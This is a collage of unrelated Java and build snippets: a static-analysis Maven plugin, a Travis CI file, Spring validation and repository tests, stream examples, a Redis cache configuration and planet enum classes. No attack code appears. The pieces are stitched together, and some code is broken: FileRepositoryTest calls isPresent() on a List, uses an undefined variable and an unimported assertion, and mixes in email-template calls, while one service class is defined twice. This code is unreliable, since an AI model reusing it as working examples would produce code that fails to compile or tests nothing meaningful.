        List<ITypeLoader> deps = new ArrayList<>();
        for (DependencyNode dependencyNode : nodes) {
            int state = dependencyNode.getState();

            // checking that transitive dependency is NOT excluded
            if (state == DependencyNode.INCLUDED) {
                Artifact artifact = dependencyNode.getArtifact();
                addDependency(artifact, deps);
            }
        }
        
        if (deps.isEmpty()) {
            return repo;
        }
        
        return new CompositeRepository(
            Arrays.asList(repo, new AuxRepository(new CompositeTypeLoader(deps.toArray(new ITypeLoader[0])))));
    }

    private void addDependency(Artifact art, List<ITypeLoader> deps) throws IOException {
        if ("compile".equals(art.getScope())) {
            ArtifactRepository localRepository = session.getLocalRepository();
            File f = localRepository.find(art).getFile();
            if (f != null) {
                Path path = f.toPath();
                if (!quiet) {
                    getLog().info("HuntBugs: +dep " + path);
                }
                if (Files.isRegularFile(path) && art.getType().equals("jar")) {
                    deps.add(new JarTypeLoader(new JarFile(path.toFile())));
                } else if (Files.isDirectory(path)) {
                    deps.add(new ClasspathTypeLoader(path.toString()));
                }
            }
        }
    }

    private AnalysisOptions constructOptions() {
        AnalysisOptions options = new AnalysisOptions();
        options.minScore = minScore;
        
        return options;
    }
    
    private void addAnalysisProgressListener(Context ctx) {
        long[] lastPrint = {0};
        ctx.addListener((stepName, className, count, total) -> {
            if (count == total || System.currentTimeMillis() - lastPrint[0] > 2000) {
                getLog().info("HuntBugs: " + stepName + " [" + count + "/" + total + "]");
                lastPrint[0] = System.currentTimeMillis();
            }
            return true;
        });
    }
    
    private void writeReports(Context ctx) throws Exception {
        getLog().info("HuntBugs: Writing report (" + ctx.getStat("Warnings") + " warnings)");
        Path path = outputDirectory.toPath();
        Files.createDirectories(path);
        Path xmlFile = path.resolve("report.xml");
        Path htmlFile = path.resolve("report.html");
        HuntBugsResult res = ctx;
        if(diff && Files.isRegularFile(xmlFile)) {
            res = Reports.diff(XmlReportReader.read(ctx, xmlFile), ctx);
        }
        Reports.write(xmlFile, htmlFile, res);
        if (failScore > 0 && res.warnings().mapToInt(Warning::getScore).anyMatch(score -> score >= failScore)) {
            throw new MojoFailureException("There are warnings with score higher than " + failScore);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@WarningDefinition(category = "Performance", name = "WrongMapIteratorValues", maxScore = 55)
--------------------------------------------------------------------------------------------------------
language: java
python:
  - "2.7"
addons:
  apt:
    packages:
      - python-pip
      - python-virtualenv
      - wget
      - mercurial

# Use Trusty to get enough RAM
sudo: required
dist: trusty

env:
  global:
    - JVMCI_VERSION="jvmci-0.36"
    - JVMCI_BASE_JDK8="openjdk1.8.0_141"
    - JDK9_BUILD="181"
  matrix:
    - JDK="jdk8" GATE="style,fullbuild"
    - JDK="jdk8" GATE="build,test"
    - JDK="jdk8" GATE="build,bootstraplite"
    - JDK="jdk9" GATE="style,fullbuild"
    - JDK="jdk9" GATE="build,test"
    - JDK="jdk9" GATE="build,bootstraplite"
install:
  - |
      export MX_PATH=${TRAVIS_BUILD_DIR}/../mx
      git clone https://github.com/graalvm/mx.git ${MX_PATH}
      export PATH=${PATH}:${MX_PATH}
  - |
      if [[ ${GATE} == *style* ]]
      then
        virtualenv venv
        source venv/bin/activate
        pip install astroid==1.1.0
        pip install pylint==1.1.0
        export ECLIPSE_TAR=${TRAVIS_BUILD_DIR}/../eclipse.tar.gz
        wget http://archive.eclipse.org/eclipse/downloads/drops4/R-4.5.2-201602121500/eclipse-SDK-4.5.2-linux-gtk-x86_64.tar.gz -O ${ECLIPSE_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${ECLIPSE_TAR}
        export ECLIPSE_EXE=${TRAVIS_BUILD_DIR}/../eclipse/eclipse
      fi
  - |
      if [[ ${GATE} == *fullbuild* ]]
      then
        # JDT is not supported on JDK9
        if [ "${JDK}" != "jdk9" ]
        then
          export JDT=${MX_PATH}/ecj.jar
          wget http://archive.eclipse.org/eclipse/downloads/drops4/R-4.5.2-201602121500/ecj-4.5.2.jar -O ${JDT}
        fi
      fi
  - |
      if [ "${JDK}" == "jdk8" ]
      then
        JDK_TAR=${TRAVIS_BUILD_DIR}/../jdk.tar.gz
        wget https://github.com/dougxc/openjdk8-jvmci-builder/releases/download/${JVMCI_VERSION}/${JVMCI_BASE_JDK8}-${JVMCI_VERSION}-linux-amd64.tar.gz -O ${JDK_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${JDK_TAR}
        export JAVA_HOME=${TRAVIS_BUILD_DIR}/../${JVMCI_BASE_JDK8}-${JVMCI_VERSION}
      fi
  - |
      if [ "${JDK}" == "jdk9" ]
      then
        JDK_TAR=${TRAVIS_BUILD_DIR}/../jdk.tar.gz
        wget http://download.java.net/java/jdk9/archive/${JDK9_BUILD}/binaries/jdk-9+${JDK9_BUILD}_linux-x64_bin.tar.gz -O ${JDK_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${JDK_TAR}
        export JAVA_HOME=${TRAVIS_BUILD_DIR}/../jdk-9
      fi
script:
  - echo ${JAVA_HOME}
  - ${JAVA_HOME}/bin/java -version
  - mx -v --primary-suite-path ${TRAVIS_BUILD_DIR}/compiler --java-home=${JAVA_HOME} gate --strict-mode --tags ${GATE}
after_failure:
  - cat hs_err*
--------------------------------------------------------------------------------------------------------
<changeSet author="mark" id="2013-07-15-01">
    <update tableName="MyTable">
        <column name="MyColumn" valueComputed="upper(MyColumn)"/>
    </update>
</changeSet>
--------------------------------------------------------------------------------------------------------
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = ValidateRequestBodyController.class)
class ValidateRequestBodyControllerTest {

  @Autowired
  private MockMvc mvc;

  @Autowired
  private ObjectMapper objectMapper;

  @Test
  void whenInputIsInvalid_thenReturnsStatus400() throws Exception {
    Input input = invalidInput();
    String body = objectMapper.writeValueAsString(input);

    mvc.perform(post("/validateBody")
            .contentType("application/json")
            .content(body))
            .andExpect(status().isBadRequest());
  }
}
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = ValidateParametersController.class)
class ValidateParametersControllerTest {

  @Autowired
  private MockMvc mvc;

  @Test
  void whenPathVariableIsInvalid_thenReturnsStatus400() throws Exception {
    mvc.perform(get("/validatePathVariable/3"))
            .andExpect(status().isBadRequest());
  }

  @Test
  void whenRequestParameterIsInvalid_thenReturnsStatus400() throws Exception {
    mvc.perform(get("/validateRequestParameter")
            .param("param", "3"))
            .andExpect(status().isBadRequest());
  }
}
@ExtendWith(SpringExtension.class)
@SpringBootTest
class ValidatingServiceTest {

  @Autowired
  private ValidatingService service;

  @Test
  void whenInputIsInvalid_thenThrowsException(){
    Input input = invalidInput();

    assertThrows(ConstraintViolationException.class, () -> {
      service.validateInput(input);
    });
  }
}
@ExtendWith(SpringExtension.class)
@DataJpaTest
class ValidatingRepositoryTest {

  @Autowired
  private ValidatingRepository repository;

  @Autowired
  private EntityManager entityManager;

  @Test
  void whenInputIsInvalid_thenThrowsException() {
    Input input = invalidInput();

    assertThrows(ConstraintViolationException.class, () -> {
      repository.save(input);
      entityManager.flush();
    });
  }
}

class ProgrammaticallyValidatingService {
  
  void validateInput(Input input) {
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }
}

@Service
class ProgrammaticallyValidatingService {

  private Validator validator;

  ProgrammaticallyValidatingService(Validator validator) {
    this.validator = validator;
  }

  void validateInputWithInjectedValidator(Input input) {
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }
}
--------------------------------------------------------------------------------------------------------
Get an arbitrary List implementation holding the result:

List<T> results = l.stream().filter(…).collect(Collectors.toList());
Get an arbitrary Set implementation holding the result:

Set<T> results = l.stream().filter(…).collect(Collectors.toSet());
Get a specific Collection:

ArrayList<T> results =
  l.stream().filter(…).collect(Collectors.toCollection(ArrayList::new));
Add to an existing Collection:

l.stream().filter(…).forEach(existing::add);
Create an array:

String[] array=l.stream().filter(…).toArray(String[]::new);
Use the array to create a list with a specific specific behavior (mutable, fixed size):

List<String> al=Arrays.asList(l.stream().filter(…).toArray(String[]::new));
Allow a parallel capable stream to add to temporary local lists and join them afterward:

List<T> results
  = l.stream().filter(…).collect(ArrayList::new, List::add, List::addAll);
--------------------------------------------------------------------------------------------------------
    @Autowired
    private SessionService sessionService;
    @Autowired
    private ProductRepository productRepository;
    @Autowired
    private VersionServiceImpl versionService;
    @Autowired
    private VersionRepository versionRepository;

    @GetMapping("/myusers2")
    public ResponseEntity<FileEntity> findAllByQuerydsl2(@RequestParam(value = "sku") String sku,
                                                         @RequestParam(value = "version", required = false) String version,
                                                         @RequestParam(value = "locale") String locale,
                                                         @RequestParam(value = "platform") String platform) {
        return this.getFileService().searchFileRecord(NamingFileSearchParameters.of(sku, version, locale, platform))
                .map(entity -> ResponseEntity.ok(entity))
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_BY_REQUEST_NOT_FOUND_MESSAGE_TEMPLATE, sku, version, locale, platform));
    }

    @GetMapping("/user")
    public ResponseEntity<CompletableFuture<Iterable<ProductEntity>>> user() {
        return ResponseEntity.ok().body(this.getProductRepository().findByUserIsCurrentUser());
    }

    @GetMapping("/created")
    public ResponseEntity init() {
        final Session session = new Session();
        session.setId("c108cda3-8b4b-483d-a987-d65e6bfe3024");
        session.setFilepath("C:\\git-project\\paragon.microservices.distributor");
        session.setFilename("lombok.config");
        session.setDownloadStatus(DownloadStatus.NEW);
        this.getSessionService().save(session);
        return ResponseEntity.ok().build();
    }
--------------------------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.cache;

import org.springframework.boot.autoconfigure.cache.CacheManagerCustomizer;
import org.springframework.cache.annotation.CachingConfigurerSupport;
import org.springframework.cache.interceptor.KeyGenerator;
import org.springframework.context.annotation.Bean;
import org.springframework.data.redis.cache.RedisCacheManager;

import java.util.Arrays;
import java.util.Optional;

public class CacheApiConfiguration extends CachingConfigurerSupport {

//    @Bean
//    public <K, V> CacheManager cacheManager(final RedisTemplate<K, V> redisTemplate) {
//        final RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate);
//        cacheManager.setTransactionAware(true);
//        //cacheManager.setUsePrefix(true); // THIS IS NEEDED!
//        return cacheManager;
//    }

    @Bean
    public <T extends RedisCacheManager> CacheManagerCustomizer<T> redisCacheManagerCustomizer() {
        return cacheManager -> cacheManager.setTransactionAware(true);
    }

    @Bean
    @Override
    public KeyGenerator keyGenerator() {
        return (target, method, params) -> {
            final StringBuilder sb = new StringBuilder();
            sb.append(target.getClass().getName());
            sb.append(method.getName());
            Arrays.stream(Optional.of(params).orElseGet(() -> new Object[0])).forEach(sb::append);
            return sb.toString();
        };
    }
}

--------------------------------------------------------------------------------------------------------
@FieldBridge(impl = ScanResultBridge.class)

spring:
  jpa:
    properties:
      javax:
        persistence:
          schema-generation:
            create-source: metadata
            scripts:
              action: create
              create-target: create.sql
--------------------------------------------------------------------------------------------------------
        <!-- Mailing Contour testing library dependencies -->
        <dependency>
            <groupId>com.paragon.mailingcontour</groupId>
            <artifactId>paragon.mailingcontour.commons</artifactId>
            <version>${mailingcontour.commons.version}</version>
            <classifier>tests</classifier>
            <type>test-jar</type>
            <scope>test</scope>
        </dependency>
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.repository;

import com.google.common.collect.Lists;
import com.paragon.mailingcontour.commons.annotation.PostgresDataJpaTest;
import com.paragon.microservices.distributor.AbstractTest;
import com.paragon.microservices.distributor.model.dto.request.OffsetPageRequest;
import com.paragon.microservices.distributor.model.entity.FileEntity;
import com.paragon.microservices.documents.generator.server.exception.ResourceNotFoundException;
import com.paragon.microservices.documents.generator.server.model.EmailTemplateEntity;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.junit.FixMethodOrder;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.MethodSorters;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.MessageSource;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.test.annotation.DirtiesContext;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.context.jdbc.Sql;
import org.springframework.test.context.jdbc.SqlConfig;
import org.springframework.test.context.jdbc.SqlGroup;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import java.util.*;

import static com.paragon.mailingcontour.commons.TestUtils.containsIds;
import static org.hamcrest.CoreMatchers.*;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.empty;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.core.IsNull.nullValue;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

@Slf4j
@Getter(AccessLevel.PROTECTED)
@RunWith(SpringJUnit4ClassRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.DEFINED_PORT)
@AutoConfigureMockMvc
@TestPropertySource(locations = "fileInfo:src/test/resources/application.properties")
@SqlGroup({
        @Sql(executionPhase = Sql.ExecutionPhase.BEFORE_TEST_METHOD, scripts = "classpath:test-distributor-db-before.sql", config = @SqlConfig(transactionMode = SqlConfig.TransactionMode.ISOLATED)),
        @Sql(executionPhase = Sql.ExecutionPhase.AFTER_TEST_METHOD, scripts = "classpath:test-distributor-db-after.sql", config = @SqlConfig(transactionMode = SqlConfig.TransactionMode.ISOLATED))
})
@PostgresDataJpaTest
@FixMethodOrder(MethodSorters.NAME_ASCENDING)
@DirtiesContext(classMode = DirtiesContext.ClassMode.BEFORE_EACH_TEST_METHOD)
public class FileRepositoryTest extends AbstractTest {

    public static final UUID FILE_ENTITY_ID1 = UUID.fromString("21814afc-c1bc-41e6-b6e6-710bf7fd34ce");
    public static final UUID FILE_ENTITY_ID2 = UUID.fromString("9008bc61-9851-42bd-ad41-781b94b4f1ab");
    public static final UUID FILE_ENTITY_ID3 = UUID.fromString("840d76ab-fe30-46f7-b298-2cb459b3cba6");

    @Autowired
    private FileRepository fileRepository;
    @Autowired
    private MessageSource messageSource;

    @Test
    public void test_FindAll_Files() {
        // when
        final List<FileEntity> files = this.fileRepository.findAll();

        // then
        assertThat(files, not(empty()));
        assertThat(files, hasSize(25));
    }

    @Test
    public void test_FindAllBy_FileIds() {
        // given
        final UUID[] templateIdsToCheck = {FILE_ENTITY_ID1, FILE_ENTITY_ID2, FILE_ENTITY_ID3};

        // when
        final List<FileEntity> templates = this.fileRepository.findAllById(Arrays.asList(templateIdsToCheck));

        // then
        assertThat(templates, not(empty()));
        assertThat(templates, hasSize(templateIdsToCheck.length));
        assertTrue(containsIds(templates, templateIdsToCheck));
    }

    @Test
    public void test_FindByNonExisting_ProductVersionId() {
        // given
        final UUID productId = PRODUCT_ID;
        final UUID versionId = VERSION_ID;

        // when
        final List<? extends FileEntity> files = this.fileRepository.findAllByProductVersionId(productId, versionId);

        // then
        assertFalse(files.isPresent());
    }

    @Test
    public void test_FindBy_TemplateName() {
        // given
        final UUID productId = PRODUCT_ID;
        final UUID versionId = VERSION_ID;

        // when
        final Pageable pageable = OffsetPageRequest.builder().limit(2).build();
        final Page<FileEntity> templateOptional = this.fileRepository.findAllByProductVersionId(productId, versionId, pageable);

        // then
        assertTrue(templateOptional.isPresent());
        assertEquals(FILE_ENTITY_ID1, templateOptional.get().getId());
        assertEquals(templateName, templateOptional.get().getName());
    }

    @Test
    public void testFindByNonExistingTemplateNameAndLocale() {
        // given
        final String templateName = "test";
        final Locale templateLocale = Locale.ITALIAN;

        // when
        final Optional<EmailTemplateEntity> templateOptional = getEmailTemplateRepository().findByNameAndLocaleOrByDefaultLocale(templateName, templateLocale, Locale.getDefault());

        // then
        assertFalse(templateOptional.isPresent());
    }

    @Test
    public void testFindByTemplateNameAndLocale() {
        // given
        final String templateName = "Test 13";
        final Locale templateLocale = Locale.ENGLISH;

        // when
        final Optional<EmailTemplateEntity> templateOptional = getEmailTemplateRepository().findByNameAndLocaleOrByDefaultLocale(templateName, templateLocale, Locale.getDefault());

        // then
        assertTrue(templateOptional.isPresent());
        assertThat(templateOptional.get().getId(), equalTo(UUID.fromString("7f7d29b9-2c61-456e-888c-b39541850385")));
        assertThat(templateOptional.get().getName(), equalTo(templateName));
        assertThat(templateOptional.get().getBody(), equalTo("Test description 13"));
        assertThat(templateOptional.get().getLocale(), equalTo(templateLocale));
    }

    @Test
    public void testFindByTemplateNameContains() {
        // given
        final String templateName = "name";

        // when
        final Iterable<? extends EmailTemplateEntity> templateIterable = getResultAsync(getEmailTemplateRepository().findAllByNameContains(templateName));
        assertThat(templateIterable, notNullValue());
        final List<? extends EmailTemplateEntity> templates = Lists.newArrayList(templateIterable);

        // then
        assertThat(templates, not(empty()));
        assertThat(templates, hasSize(1));
        assertThat(templates.get(0).getId(), equalTo(UUID.fromString("5a901e0c-0441-4391-abba-3001ed044ab9")));
        assertThat(templates.get(0).getName(), containsString(templateName));
    }

    @Test
    public void testCreateEmailTemplate() {
        // given
        final EmailTemplateEntity emailTemplate = this.getEmailTemplate(UUID.randomUUID(), "new name", "new body", Locale.JAPANESE);

        // when
        final EmailTemplateEntity newEmailTemplate = getEmailTemplateRepository().save(emailTemplate);

        // then
        assertThat(newEmailTemplate.getId(), not(nullValue()));
        assertNotEquals(emailTemplate.getId(), newEmailTemplate.getId());
        assertEquals(emailTemplate.getName(), newEmailTemplate.getName());
        assertEquals(emailTemplate.getBody(), newEmailTemplate.getBody());
        assertEquals(emailTemplate.getLocale(), newEmailTemplate.getLocale());
    }

    @Test
    public void testCreateEmailTemplates() {
        // given
        final UUID[] templateIdsToCheck = {UUID.randomUUID(), UUID.randomUUID()};
        final EmailTemplateEntity emailTemplate = this.getEmailTemplate(templateIdsToCheck[0], "new name", "new body", Locale.JAPANESE);
        final EmailTemplateEntity emailTemplate2 = this.getEmailTemplate(templateIdsToCheck[1], "new name2", "new body2", Locale.FRENCH);

        // when
        final List<EmailTemplateEntity> newEmailTemplate = getEmailTemplateRepository().saveAll(Arrays.asList(emailTemplate, emailTemplate2));

        // then
        assertThat(newEmailTemplate, not(empty()));
        assertThat(newEmailTemplate, hasSize(2));
        assertFalse(containsIds(newEmailTemplate, templateIdsToCheck));
    }

    @Test
    public void testFindByTemplateId() {
        // when
        final Optional<EmailTemplateEntity> templateOptional = getEmailTemplateRepository().findById(FILE_ENTITY_ID1);

        // then
        assertTrue(templateOptional.isPresent());
        assertEquals(FILE_ENTITY_ID1, templateOptional.get().getId());
    }

    @Test
    public void testFindByInvalidTemplateId() {
        // given
        final UUID templateId = UUID.randomUUID();

        // when
        final Optional<EmailTemplateEntity> templateOptional = getEmailTemplateRepository().findById(templateId);

        // then
        assertFalse(templateOptional.isPresent());
    }

    @Test
    public void testFindByIds() {
        // given
        final UUID[] templateIdsToCheck = {FILE_ENTITY_ID1, FILE_ENTITY_ID2};

        // when
        final List<EmailTemplateEntity> templates = getEmailTemplateRepository().findAllById(Arrays.asList(templateIdsToCheck));

        // then
        assertThat(templates, not(empty()));
        assertThat(templates, hasSize(2));
        assertTrue(containsIds(templates, templateIdsToCheck));
    }

    @Test
    public void testFindByEmptyTemplateName() {
        // given
        final String templateName = "";

        // when
        final Optional<EmailTemplateEntity> templateOptional = getEmailTemplateRepository().findByName(templateName);

        // then
        assertFalse(templateOptional.isPresent());
    }

    @Test
    public void testFindByTemplateNameContainsInvalidValue() {
        // given
        final String templateName = "testing";

        // when
        final Iterable<? extends EmailTemplateEntity> templateIterable = getResultAsync(getEmailTemplateRepository().findAllByNameContains(templateName));
        assertThat(templateIterable, notNullValue());
        final List<? extends EmailTemplateEntity> templates = Lists.newArrayList(templateIterable);

        // then
        assertThat(templates, is(empty()));
    }

    @Test
    public void testUpdateEmailTemplate() {
        // given
        final EmailTemplateEntity emailTemplate = getEmailTemplateRepository().findById(FILE_ENTITY_ID1).orElseThrow(() -> ResourceNotFoundException.throwResourceNotFound(getMessageSource(), FILE_ENTITY_ID1));
        final String newName = getString("test", UUID.randomUUID().toString());
        emailTemplate.setName(newName);

        // when
        final EmailTemplateEntity newEmailTemplate = getEmailTemplateRepository().save(emailTemplate);

        // then
        assertEquals(emailTemplate.getId(), newEmailTemplate.getId());
        assertEquals(newName, newEmailTemplate.getName());
        assertEquals(emailTemplate.getBody(), newEmailTemplate.getBody());
        assertEquals(emailTemplate.getLocale(), newEmailTemplate.getLocale());
    }

    @Test(expected = ResourceNotFoundException.class)
    public void testFetchNotExistingEmailTemplate() {
        // when
        final UUID templateId = UUID.randomUUID();

        // then
        getEmailTemplateRepository().findById(templateId).orElseThrow(() -> ResourceNotFoundException.throwResourceNotFound(getMessageSource(), templateId));
    }

    @Test
    public void testDeleteEmailTemplate() {
        // given
        final EmailTemplateEntity emailTemplate = getEmailTemplateRepository().findById(FILE_ENTITY_ID1).orElseThrow(() -> ResourceNotFoundException.throwResourceNotFound(getMessageSource(), FILE_ENTITY_ID1));

        // when
        getEmailTemplateRepository().delete(emailTemplate);

        // then
        final Optional<EmailTemplateEntity> deletedEmailTemplate = getEmailTemplateRepository().findById(FILE_ENTITY_ID1);
        assertFalse(deletedEmailTemplate.isPresent());
    }

    @Test
    public void testDeleteEmailTemplates() {
        // given
        final UUID[] idsToCheck = {FILE_ENTITY_ID1, FILE_ENTITY_ID2};

        // when
        Iterable<? extends EmailTemplateEntity> templateIterable = getEmailTemplateRepository().findAllById(Arrays.asList(idsToCheck));
        assertThat(templateIterable, notNullValue());
        List<? extends EmailTemplateEntity> templates = Lists.newArrayList(templateIterable);

        // then
        assertThat(templates, not(empty()));
        assertThat(templates, hasSize(2));
        assertTrue(containsIds(templates, idsToCheck));

        // when
        getEmailTemplateRepository().deleteAll(templates);
        getEmailTemplateRepository().flush();

        // then
        templateIterable = getEmailTemplateRepository().findAllById(Arrays.asList(idsToCheck));
        assertThat(templateIterable, notNullValue());
        templates = Lists.newArrayList(templateIterable);
        assertThat(templates, is(empty()));
    }
}
--------------------------------------------------------------------------------------------------------
        return new Docket(DocumentationType.SWAGGER_2)
--------------------------------------------------------------------------------------------------------


    /**
     * An immutable representation of the properties of the {@link
     * CelestialBody}. Immutability is necessary to honor the contract for
     * enums.
     */
    static final class ImmutableProperties implements Properties {
        private final double mass;
        private final double radius;
        private final String name;
        private final Satellite[] satellites;
     
        public ImmutableProperties(String name, double mass, double radius,
                Satellite... satellites) {
            this.name = name;
            this.mass = mass;
            this.radius = radius;
            this.satellites = satellites == null ? null : satellites.clone();
        }
     
        @Override
        public double getMass() {
            return mass;
        }
     
        @Override
        public double getRadius() {
            return radius;
        }
     
        @Override
        public Satellite[] getSatellites() {
            return satellites == null ? null : satellites.clone();
        }
     
        @Override
        public String name() {
            return name;
        }
     
        public void printSummary() {
            System.out.println("Summary for " + name() + ":");
            System.out.printf("Surface Gravity: %1$e m/s²\n\n",
                    Util.calcSurfaceGravity(this));
     
            if (satellites != null) {
                for (Satellite satellite : getSatellites()) {
                    satellite.getProperties().printSummary();
                }
            }
        }
    }
--------------------------------------------------------------------------------------------------------


    /**
     * An immutable representation of the properties of the {@link Satellite}.
     * Immutability is necessary to honor the contract for enums.
     */
    static final class ImmutableProperties implements CelestialBody
            .Properties {
        private final Satellite satellite;
        private final double mass;
        private final double radius;
        private final double semiMajorAxis;
        private final String name;
        private final Satellite[] satellites;
     
        public ImmutableProperties(Satellite satellite, String name,
                double mass, double radius, double semiMajorAxis,
                Satellite... satellites) {
            this.satellite = satellite;
            this.name = name;
            this.mass = mass;
            this.radius = radius;
            this.semiMajorAxis = semiMajorAxis;
            this.satellites = satellites == null ? null : satellites.clone();
        }
     
        @Override
        public double getMass() {
            return mass;
        }
     
        @Override
        public double getRadius() {
            return radius;
        }
     
        @Override
        public Satellite[] getSatellites() {
            return satellites == null ? null : satellites.clone();
        }
     
        @Override
        public String name() {
            return name;
        }
     
        private CelestialBody getParentBody() {
            return satellite.getParentBody();
        }
     
        /**
         * Calculates and returns the orbital period of this {@link Satellite}
         * which orbits the given parent body. The result is given in seconds.
         *
         * @param parentBody the body around which the satellite orbits
         * @return the orbital period, in seconds
         */
        public double getOrbitalPeriod(CelestialBody parentBody) {
            return 2 * Math.PI * Math.sqrt(Math.pow(semiMajorAxis, 3.0) /
                    (GRAVITATIONAL_CONSTANT *
                            parentBody.getProperties().getMass()));
        }
     
        /**
         * Prints a summary of the calculated orbital and physical
         * characteristics of this {@link Satellite} and any of its own
         * satellites.
         */
        @Override
        public void printSummary() {
            System.out.println("Summary for " + getParentage());
     
            CelestialBody parentBody = getParentBody();
            long orbitalPeriod = (long) getOrbitalPeriod(parentBody);
            System.out.printf("Orbital Period: %1$d hours/%2$d days\n",
                    TimeUnit.SECONDS.toHours(orbitalPeriod),
                    TimeUnit.SECONDS.toDays(orbitalPeriod));
     
            System.out.printf("Surface Gravity: %1$e m/s²\n\n",
                    CelestialBody.Util.calcSurfaceGravity(this));
     
            if (satellites != null) {
                for (Satellite child : satellites) {
                    child.getProperties().printSummary();
                }
            }
        }
     
        /**
         * Generates and returns a String listing all the orbital parents of
         * this satellite.
         * <p/>
         * For example, for the Earth's moon, it would return
         * <pre>", satellite of EARTH, satellite of SOL"</pre>.
         *
         * @return a String showing orbital parentage
         */
        private String getParentage() {
            List<CelestialBody> parents = new ArrayList<CelestialBody>();
            CelestialBody parentBody = getParentBody();
            parents.add(parentBody);
            while (parentBody instanceof Satellite) {
                Satellite satelliteParent = (Satellite) parentBody;
                parentBody = satelliteParent.getParentBody();
                parents.add(parentBody);
            }
     
            StringBuilder sb = new StringBuilder(name());
            for (CelestialBody parent : parents) {
                sb.append(", satellite of ");
                sb.append(parent.getProperties().name());
            }
            sb.append(":");
     
            return sb.toString();
        }
    }
--------------------------------------------------------------------------------------------------------
    package com.ociweb.sett;
     
    /**
     * An enumeration of the planets in our solar system. We only show the inner
     * planets, for simplicity.
     */
    public enum Planet implements Satellite {
        MERCURY(0.3302e24, 2.4397e6, 57.91e9),
        VENUS(4.869e24, 6.0518e6, 108.21e9),
        EARTH(5.9742e24, 6.3781e6, 149.6e9, EarthMoon.values()),
        MARS(0.64185e24, 3.3962e6, 227.92e9, MarsMoon.values());
     
        final ImmutableProperties properties;
     
        private Planet(double mass, double radius, double semiMajorAxis) {
            this(mass, radius, semiMajorAxis, null);
        }
     
        private Planet(double mass, double radius, double semiMajorAxis,
                Satellite[] satellites) {
            this.properties = new ImmutableProperties(this, name(), mass, radius,
                    semiMajorAxis, satellites);
        }
     
        public ImmutableProperties getProperties() {
            return properties;
        }
     
        @Override
        public CelestialBody getParentBody() {
            return Star.SOL;
        }
    }
--------------------------------------------------------------------------------------------------------
    package com.ociweb.sett;
     
    /**
     * An enumeration of the stars at the center of solar systems.
     */
    public enum Star implements CelestialBody {
        SOL(1.98892e30, 6.955e8, Planet.values()); // singleton
     
        private final Properties properties;
     
        private Star(double mass, double radius, Satellite[] satellites) {
            this.properties = new ImmutableProperties(name(), mass, radius,
                    satellites);
        }
     
        public Properties getProperties() {
            return properties;
        }
    }
--------------------------------------------------------------------------------------------------------
public static EnumMap<PizzaStatus, List<Pizza>> 
  groupPizzaByStatus(List<Pizza> pzList) {
    EnumMap<PizzaStatus, List<Pizza>> map = pzList.stream().collect(
      Collectors.groupingBy(Pizza::getStatus,
      () -> new EnumMap<>(PizzaStatus.class), Collectors.toList()));
    return map;
}
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import javax.validation.constraints.NotNull;

public class Car {

    public enum FuelConsumption {
        CITY,
        HIGHWAY
    }

    private Map<@NotNull FuelConsumption, @MaxAllowedFuelConsumption Integer> fuelConsumption = new HashMap<>();

    public void setFuelConsumption(FuelConsumption consumption, int value) {
        fuelConsumption.put( consumption, value );
    }

    //...

}
--------------------------------------------------------------------------------------------------------
  /**
   * Returns this default value if the new value is null
   *
   * @param newValue     - new value
   * @param defaultValue - default value
   * @param <T>          - Represents any type that is nullable
   * @return Coalesces the newValue and defaultValue to return a non-null value
   */
  public static <T> T defaultIfAbsent(T newValue, T defaultValue) {
    return Optional.fromNullable(newValue)
        .or(Optional.fromNullable(defaultValue))
        .orNull();
  }
--------------------------------------------------------------------------------------------------------
$ ./gradlew clean build && java -jar build/libs/gs-actuator-service-0.1.0.jar
--------------------------------------------------------------------------------------------------------
import java.util.Map;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.context.junit4.SpringRunner;

import static org.assertj.core.api.BDDAssertions.then;

/**
 * Basic integration tests for service demo application.
 *
 * @author Dave Syer
 */
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@TestPropertySource(properties = {"management.port=0"})
public class HelloWorldApplicationTests {

	@LocalServerPort
	private int port;

	@Value("${local.management.port}")
	private int mgt;

	@Autowired
	private TestRestTemplate testRestTemplate;

	@Test
	public void shouldReturn200WhenSendingRequestToController() throws Exception {
		@SuppressWarnings("rawtypes")
		ResponseEntity<Map> entity = this.testRestTemplate.getForEntity(
				"http://localhost:" + this.port + "/hello-world", Map.class);

		then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
	}

	@Test
